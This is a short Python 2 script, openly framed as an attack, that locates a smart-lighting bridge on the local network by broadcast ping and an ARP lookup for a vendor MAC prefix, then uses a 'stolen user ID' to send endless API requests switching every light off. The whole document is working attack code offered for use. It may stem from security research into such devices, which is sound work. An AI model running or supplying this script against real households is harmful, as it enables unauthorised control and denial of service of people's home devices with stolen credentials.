import subprocess
import shlex
import httplib
import json
import sys
import time

print "Pinging the network.....\n\n"
time.sleep(1)


subprocess.call(["ping", "-c 20", "-b", "255.255.255.255"])


proc1 = subprocess.Popen(shlex.split('arp -na'), stdout=subprocess.PIPE)
proc2 = subprocess.Popen(shlex.split('grep "at 00:17:88"'),stdin=proc1.stdout,
						stdout=subprocess.PIPE,stderr=subprocess.PIPE)

proc1.stdout.close()
out,err=proc2.communicate()

grep_arp = '{0}'.format(out)

open_paren = grep_arp.index('(')
close_paren = grep_arp.index(')')

bridge_ip = grep_arp[open_paren+1:close_paren]
print "\nBridge IP Found: ", bridge_ip
print "\n"

unique_id = sys.argv[1]
print "Using stolen user ID: ", unique_id
print "\n"

conn = httplib.HTTPConnection(bridge_ip)
payload = {'on': False}

print "Attacking Lights!\n\n"

time.sleep(1)

while(1):	
	conn.request("PUT", "/api/"+unique_id+"/groups/0/action", json.dumps(payload))
	res = conn.getresponse()
	response = res.read()

	json_response = json.loads(response)

	print json_response

	time.sleep(1)
